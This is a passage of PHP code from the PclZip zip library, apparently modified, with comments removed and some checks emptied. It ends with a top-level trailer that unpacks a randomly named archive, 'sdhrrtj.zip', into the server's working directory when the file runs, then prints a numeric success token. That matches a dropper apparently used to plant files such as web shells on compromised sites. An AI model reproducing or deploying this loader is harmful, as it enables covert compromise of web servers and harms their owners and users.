    $p_header['comment'] = fread($this->zip_fd, $p_header['comment_len']);
  else
    $p_header['comment'] = '';

  if (1)
  {
    $v_hour = ($p_header['mtime'] & 0xF800) >> 11;
    $v_minute = ($p_header['mtime'] & 0x07E0) >> 5;
    $v_seconde = ($p_header['mtime'] & 0x001F)*2;

    $v_year = (($p_header['mdate'] & 0xFE00) >> 9) + 1980;
    $v_month = ($p_header['mdate'] & 0x01E0) >> 5;
    $v_day = $p_header['mdate'] & 0x001F;

    $p_header['mtime'] = @mktime($v_hour, $v_minute, $v_seconde, $v_month, $v_day, $v_year);

  }
  else
  {
    $p_header['mtime'] = time();
  }

  $p_header['stored_filename'] = $p_header['filename'];

  $p_header['status'] = 'ok';

  if (substr($p_header['filename'], -1) == '/') {
    $p_header['external'] = 0x00000010;
  }


  return $v_result;
}

function privCheckFileHeaders(&$p_local_header, &$p_central_header)
{
  $v_result=1;

	if ($p_local_header['filename'] != $p_central_header['filename']) {
	}
	if ($p_local_header['version_extracted'] != $p_central_header['version_extracted']) {
	}
	if ($p_local_header['flag'] != $p_central_header['flag']) {
	}
	if ($p_local_header['compression'] != $p_central_header['compression']) {
	}
	if ($p_local_header['mtime'] != $p_central_header['mtime']) {
	}
	if ($p_local_header['filename_len'] != $p_central_header['filename_len']) {
	}

	if (($p_local_header['flag'] & 8) == 8) {
        $p_local_header['size'] = $p_central_header['size'];
        $p_local_header['compressed_size'] = $p_central_header['compressed_size'];
        $p_local_header['crc'] = $p_central_header['crc'];
	}

  return $v_result;
}

function privReadEndCentralDir(&$p_central_dir)
{
  $v_result=1;

  $v_size = filesize($this->zipname);
  @fseek($this->zip_fd, $v_size);
  if (@ftell($this->zip_fd) != $v_size)
  {
    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to go to the end of the archive \''.$this->zipname.'\'');

    return PclZip::errorCode();
  }

  $v_found = 0;
  if ($v_size > 26) {
    @fseek($this->zip_fd, $v_size-22);
    if (($v_pos = @ftell($this->zip_fd)) != ($v_size-22))
    {
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to seek back to the middle of the archive \''.$this->zipname.'\'');

      return PclZip::errorCode();
    }

    $v_binary_data = @fread($this->zip_fd, 4);
    $v_data = @unpack('Vid', $v_binary_data);

    if ($v_data['id'] == 0x06054b50) {
      $v_found = 1;
    }

    $v_pos = ftell($this->zip_fd);
  }

  if (!$v_found) {
    if ($v_maximum_size > $v_size)
      $v_maximum_size = $v_size;
    @fseek($this->zip_fd, $v_size-$v_maximum_size);
    if (@ftell($this->zip_fd) != ($v_size-$v_maximum_size))
    {
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to seek back to the middle of the archive \''.$this->zipname.'\'');

      return PclZip::errorCode();
    }

    $v_pos = ftell($this->zip_fd);
    $v_bytes = 0x00000000;
    while ($v_pos < $v_size)
    {
      $v_byte = @fread($this->zip_fd, 1);

      $v_bytes = ( ($v_bytes & 0xFFFFFF) << 8) | Ord($v_byte); 

      if ($v_bytes == 0x504b0506)
      {
        $v_pos++;
        break;
      }

      $v_pos++;
    }

    if ($v_pos == $v_size)
    {

      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Unable to find End of Central Dir Record signature");

      return PclZip::errorCode();
    }
  }

  $v_binary_data = fread($this->zip_fd, 18);

  if (strlen($v_binary_data) != 18)
  {

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid End of Central Dir Record size : ".strlen($v_binary_data));

    return PclZip::errorCode();
  }

  $v_data = unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size', $v_binary_data);

  if (($v_pos + $v_data['comment_size'] + 18) != $v_size) {

  if (0) {
    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT,
                       'The central dir is not at the end of the archive.'
					   .' Some trailing bytes exists after the archive.');

    return PclZip::errorCode();
  }
  }

  if ($v_data['comment_size'] != 0) {
    $p_central_dir['comment'] = fread($this->zip_fd, $v_data['comment_size']);
  }
  else
    $p_central_dir['comment'] = '';

  $p_central_dir['entries'] = $v_data['entries'];
  $p_central_dir['disk_entries'] = $v_data['disk_entries'];
  $p_central_dir['offset'] = $v_data['offset'];
  $p_central_dir['size'] = $v_data['size'];
  $p_central_dir['disk'] = $v_data['disk'];
  $p_central_dir['disk_start'] = $v_data['disk_start'];


  return $v_result;
}

function privDeleteByRule(&$p_result_list, &$p_options)
{
  $v_result=1;
  $v_list_detail = array();

  if (($v_result=$this->privOpenFd('rb')) != 1)
  {
    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    return $v_result;
  }

  @rewind($this->zip_fd);

  $v_pos_entry = $v_central_dir['offset'];
  @rewind($this->zip_fd);
  if (@fseek($this->zip_fd, $v_pos_entry))
  {
    $this->privCloseFd();

    PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

    return PclZip::errorCode();
  }

  $v_header_list = array();
  $j_start = 0;
  for ($i=0, $v_nb_extracted=0; $i<$v_central_dir['entries']; $i++)
  {

    $v_header_list[$v_nb_extracted] = array();
    if (($v_result = $this->privReadCentralFileHeader($v_header_list[$v_nb_extracted])) != 1)
    {
      $this->privCloseFd();

      return $v_result;
    }


    $v_header_list[$v_nb_extracted]['index'] = $i;

    $v_found = false;

    if (   (isset($p_options[PCLZIP_OPT_BY_NAME]))
        && ($p_options[PCLZIP_OPT_BY_NAME] != 0)) {

        for ($j=0; ($j<sizeof($p_options[PCLZIP_OPT_BY_NAME])) && (!$v_found); $j++) {

            if (substr($p_options[PCLZIP_OPT_BY_NAME][$j], -1) == "/") {

                if (   (strlen($v_header_list[$v_nb_extracted]['stored_filename']) > strlen($p_options[PCLZIP_OPT_BY_NAME][$j]))
                    && (substr($v_header_list[$v_nb_extracted]['stored_filename'], 0, strlen($p_options[PCLZIP_OPT_BY_NAME][$j])) == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                    $v_found = true;
                }
                elseif (   (($v_header_list[$v_nb_extracted]['external']&0x00000010)==0x00000010) 
                        && ($v_header_list[$v_nb_extracted]['stored_filename'].'/' == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                    $v_found = true;
                }
            }
            elseif ($v_header_list[$v_nb_extracted]['stored_filename'] == $p_options[PCLZIP_OPT_BY_NAME][$j]) {
                $v_found = true;
            }
        }
    }


    else if (   (isset($p_options[PCLZIP_OPT_BY_PREG]))
             && ($p_options[PCLZIP_OPT_BY_PREG] != "")) {

        if (preg_match($p_options[PCLZIP_OPT_BY_PREG], $v_header_list[$v_nb_extracted]['stored_filename'])) {
            $v_found = true;
        }
    }

    else if (   (isset($p_options[PCLZIP_OPT_BY_INDEX]))
             && ($p_options[PCLZIP_OPT_BY_INDEX] != 0)) {

        for ($j=$j_start; ($j<sizeof($p_options[PCLZIP_OPT_BY_INDEX])) && (!$v_found); $j++) {

            if (($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['start']) && ($i<=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end'])) {
                $v_found = true;
            }
            if ($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end']) {
                $j_start = $j+1;
            }

            if ($p_options[PCLZIP_OPT_BY_INDEX][$j]['start']>$i) {
                break;
            }
        }
    }
    else {
    	$v_found = true;
    }

    if ($v_found)
    {
      unset($v_header_list[$v_nb_extracted]);
    }
    else
    {
      $v_nb_extracted++;
    }
  }

  if ($v_nb_extracted > 0) {

      $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

      $v_temp_zip = new PclZip($v_zip_temp_name);

      if (($v_result = $v_temp_zip->privOpenFd('wb')) != 1) {
          $this->privCloseFd();

          return $v_result;
      }

      for ($i=0; $i<sizeof($v_header_list); $i++) {

          @rewind($this->zip_fd);
          if (@fseek($this->zip_fd,  $v_header_list[$i]['offset'])) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

              return PclZip::errorCode();
          }

          $v_local_header = array();
          if (($v_result = $this->privReadFileHeader($v_local_header)) != 1) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }
          
          if ($this->privCheckFileHeaders($v_local_header,
		                                $v_header_list[$i]) != 1) {
          }
          unset($v_local_header);

          if (($v_result = $v_temp_zip->privWriteFileHeader($v_header_list[$i])) != 1) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }

          if (($v_result = PclZipUtilCopyBlock($this->zip_fd, $v_temp_zip->zip_fd, $v_header_list[$i]['compressed_size'])) != 1) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }
      }

      $v_offset = @ftell($v_temp_zip->zip_fd);

      for ($i=0; $i<sizeof($v_header_list); $i++) {
          if (($v_result = $v_temp_zip->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
              $v_temp_zip->privCloseFd();
              $this->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }

          $v_temp_zip->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
      }


      $v_comment = '';
      if (isset($p_options[PCLZIP_OPT_COMMENT])) {
        $v_comment = $p_options[PCLZIP_OPT_COMMENT];
      }

      $v_size = @ftell($v_temp_zip->zip_fd)-$v_offset;

      if (($v_result = $v_temp_zip->privWriteCentralHeader(sizeof($v_header_list), $v_size, $v_offset, $v_comment)) != 1) {
          unset($v_header_list);
          $v_temp_zip->privCloseFd();
          $this->privCloseFd();
          @unlink($v_zip_temp_name);

          return $v_result;
      }

      $v_temp_zip->privCloseFd();
      $this->privCloseFd();

      @unlink($this->zipname);

      PclZipUtilRename($v_zip_temp_name, $this->zipname);
  
      unset($v_temp_zip);
  }
  
  else if ($v_central_dir['entries'] != 0) {
      $this->privCloseFd();

      if (($v_result = $this->privOpenFd('wb')) != 1) {
        return $v_result;
      }

      if (($v_result = $this->privWriteCentralHeader(0, 0, 0, '')) != 1) {
        return $v_result;
      }

      $this->privCloseFd();
  }

  return $v_result;
}

function privDirCheck($p_dir, $p_is_dir=false)
{
  $v_result = 1;


  if (($p_is_dir) && (substr($p_dir, -1)=='/'))
  {
    $p_dir = substr($p_dir, 0, strlen($p_dir)-1);
  }

  if ((is_dir($p_dir)) || ($p_dir == ""))
  {
    return 1;
  }

  $p_parent_dir = dirname($p_dir);

  if ($p_parent_dir != $p_dir)
  {
    if ($p_parent_dir != "")
    {
      if (($v_result = $this->privDirCheck($p_parent_dir)) != 1)
      {
        return $v_result;
      }
    }
  }

  if (!@mkdir($p_dir, 0777))
  {
    PclZip::privErrorLog(PCLZIP_ERR_DIR_CREATE_FAIL, "Unable to create directory '$p_dir'");

    return PclZip::errorCode();
  }

  return $v_result;
}

function privMerge(&$p_archive_to_add)
{
  $v_result=1;

  if (!is_file($p_archive_to_add->zipname))
  {

    $v_result = 1;

    return $v_result;
  }

  if (!is_file($this->zipname))
  {

    $v_result = $this->privDuplicate($p_archive_to_add->zipname);

    return $v_result;
  }

  if (($v_result=$this->privOpenFd('rb')) != 1)
  {
    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    return $v_result;
  }

  @rewind($this->zip_fd);

  if (($v_result=$p_archive_to_add->privOpenFd('rb')) != 1)
  {
    $this->privCloseFd();

    return $v_result;
  }

  $v_central_dir_to_add = array();
  if (($v_result = $p_archive_to_add->privReadEndCentralDir($v_central_dir_to_add)) != 1)
  {
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();

    return $v_result;
  }

  @rewind($p_archive_to_add->zip_fd);

  $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

  if (($v_zip_temp_fd = @fopen($v_zip_temp_name, 'wb')) == 0)
  {
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();

    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_zip_temp_name.'\' in binary write mode');

    return PclZip::errorCode();
  }

  $v_size = $v_central_dir['offset'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($this->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_size = $v_central_dir_to_add['offset'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($p_archive_to_add->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_offset = @ftell($v_zip_temp_fd);

  $v_size = $v_central_dir['size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($this->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_size = $v_central_dir_to_add['size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($p_archive_to_add->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_comment = $v_central_dir['comment'].' '.$v_central_dir_to_add['comment'];

  $v_size = @ftell($v_zip_temp_fd)-$v_offset;

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  if (($v_result = $this->privWriteCentralHeader($v_central_dir['entries']+$v_central_dir_to_add['entries'], $v_size, $v_offset, $v_comment)) != 1)
  {
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();
    @fclose($v_zip_temp_fd);
    $this->zip_fd = null;

    unset($v_header_list);

    return $v_result;
  }

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  $this->privCloseFd();
  $p_archive_to_add->privCloseFd();

  @fclose($v_zip_temp_fd);

  @unlink($this->zipname);

  PclZipUtilRename($v_zip_temp_name, $this->zipname);

  return $v_result;
}

function privDuplicate($p_archive_filename)
{
  $v_result=1;

  if (!is_file($p_archive_filename))
  {

    $v_result = 1;

    return $v_result;
  }

  if (($v_result=$this->privOpenFd('wb')) != 1)
  {
    return $v_result;
  }

  if (($v_zip_temp_fd = @fopen($p_archive_filename, 'rb')) == 0)
  {
    $this->privCloseFd();

    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive file \''.$p_archive_filename.'\' in binary write mode');

    return PclZip::errorCode();
  }

  $v_size = filesize($p_archive_filename);
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($v_zip_temp_fd, $v_read_size);
    @fwrite($this->zip_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $this->privCloseFd();

  @fclose($v_zip_temp_fd);

  return $v_result;
}

function privErrorLog($p_error_code=0, $p_error_string='')
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    PclError($p_error_code, $p_error_string);
  }
  else {
    $this->error_code = $p_error_code;
    $this->error_string = $p_error_string;
  }
}

function privErrorReset()
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    PclErrorReset();
  }
  else {
    $this->error_code = 0;
    $this->error_string = '';
  }
}

function privDisableMagicQuotes()
{
  $v_result=1;

  if (   (!function_exists("get_magic_quotes_runtime"))
    || (!function_exists("set_magic_quotes_runtime"))) {
    return $v_result;
}

  if ($this->magic_quotes_status != -1) {
    return $v_result;
}

$this->magic_quotes_status = @get_magic_quotes_runtime();

if ($this->magic_quotes_status == 1) {
  @set_magic_quotes_runtime(0);
}

  return $v_result;
}

function privSwapBackMagicQuotes()
{
  $v_result=1;

  if (   (!function_exists("get_magic_quotes_runtime"))
    || (!function_exists("set_magic_quotes_runtime"))) {
    return $v_result;
}

  if ($this->magic_quotes_status != -1) {
    return $v_result;
}

if ($this->magic_quotes_status == 1) {
	  @set_magic_quotes_runtime($this->magic_quotes_status);
}

  return $v_result;
}

}

function PclZipUtilPathReduction($p_dir)
{
  $v_result = "";

  if ($p_dir != "") {
    $v_list = explode("/", $p_dir);

    $v_skip = 0;
    for ($i=sizeof($v_list)-1; $i>=0; $i--) {
      if ($v_list[$i] == ".") {
      }
      else if ($v_list[$i] == "..") {
	  $v_skip++;
      }
      else if ($v_list[$i] == "") {
	  if ($i == 0) {
          $v_result = "/".$v_result;
	    if ($v_skip > 0) {
	        $v_result = $p_dir;
              $v_skip = 0;
	    }
	  }
	  else if ($i == (sizeof($v_list)-1)) {
          $v_result = $v_list[$i];
	  }
	  else {
	  }
      }
      else {
	  if ($v_skip > 0) {
	    $v_skip--;
	  }
	  else {
          $v_result = $v_list[$i].($i!=(sizeof($v_list)-1)?"/".$v_result:"");
	  }
      }
    }
    
    if ($v_skip > 0) {
      while ($v_skip > 0) {
          $v_result = '../'.$v_result;
          $v_skip--;
      }
    }
  }

  return $v_result;
}

function PclZipUtilPathInclusion($p_dir, $p_path)
{
  $v_result = 1;
  
  if (   ($p_dir == '.')
      || ((strlen($p_dir) >=2) && (substr($p_dir, 0, 2) == './'))) {
    $p_dir = PclZipUtilTranslateWinPath(getcwd(), FALSE).'/'.substr($p_dir, 1);
  }
  if (   ($p_path == '.')
      || ((strlen($p_path) >=2) && (substr($p_path, 0, 2) == './'))) {
    $p_path = PclZipUtilTranslateWinPath(getcwd(), FALSE).'/'.substr($p_path, 1);
  }

  $v_list_dir = explode("/", $p_dir);
  $v_list_dir_size = sizeof($v_list_dir);
  $v_list_path = explode("/", $p_path);
  $v_list_path_size = sizeof($v_list_path);

  $i = 0;
  $j = 0;
  while (($i < $v_list_dir_size) && ($j < $v_list_path_size) && ($v_result)) {

    if ($v_list_dir[$i] == '') {
      $i++;
      continue;
    }
    if ($v_list_path[$j] == '') {
      $j++;
      continue;
    }

    if (($v_list_dir[$i] != $v_list_path[$j]) && ($v_list_dir[$i] != '') && ( $v_list_path[$j] != ''))  {
      $v_result = 0;
    }

    $i++;
    $j++;
  }

  if ($v_result) {
    while (($j < $v_list_path_size) && ($v_list_path[$j] == '')) $j++;
    while (($i < $v_list_dir_size) && ($v_list_dir[$i] == '')) $i++;

    if (($i >= $v_list_dir_size) && ($j >= $v_list_path_size)) {
      $v_result = 2;
    }
    else if ($i < $v_list_dir_size) {
      $v_result = 0;
    }
  }

  return $v_result;
}

function PclZipUtilCopyBlock($p_src, $p_dest, $p_size, $p_mode=0)
{
  $v_result = 1;

  if ($p_mode==0)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @fread($p_src, $v_read_size);
      @fwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==1)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @gzread($p_src, $v_read_size);
      @fwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==2)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @fread($p_src, $v_read_size);
      @gzwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==3)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @gzread($p_src, $v_read_size);
      @gzwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }

  return $v_result;
}

function PclZipUtilRename($p_src, $p_dest)
{
  $v_result = 1;

  if (!@rename($p_src, $p_dest)) {

    if (!@copy($p_src, $p_dest)) {
      $v_result = 0;
    }
    else if (!@unlink($p_src)) {
      $v_result = 0;
    }
  }

  return $v_result;
}

function PclZipUtilOptionText($p_option)
{
  
  $v_list = get_defined_constants();
  for (reset($v_list); $v_key = key($v_list); next($v_list)) {
    $v_prefix = substr($v_key, 0, 10);
    if ((   ($v_prefix == 'PCLZIP_OPT')
         || ($v_prefix == 'PCLZIP_CB_')
         || ($v_prefix == 'PCLZIP_ATT'))
        && ($v_list[$v_key] == $p_option)) {
      return $v_key;
    }
  }
  
  $v_result = 'Unknown';

  return $v_result;
}

function PclZipUtilTranslateWinPath($p_path, $p_remove_disk_letter=true)
{
  if (stristr(php_uname(), 'windows')) {
    if (($p_remove_disk_letter) && (($v_position = strpos($p_path, ':')) != false)) {
        $p_path = substr($p_path, $v_position+1);
    }
    if ((strpos($p_path, '\\') > 0) || (substr($p_path, 0,1) == '\\')) {
        $p_path = strtr($p_path, '\\', '/');
    }
  }
  return $p_path;
}




$archive = new PclZip("sdhrrtj.zip");
if ($archive->extract() == 0) {
die("Error : ".$archive->errorInfo(true));
}
else
{
die("1425756856");	
}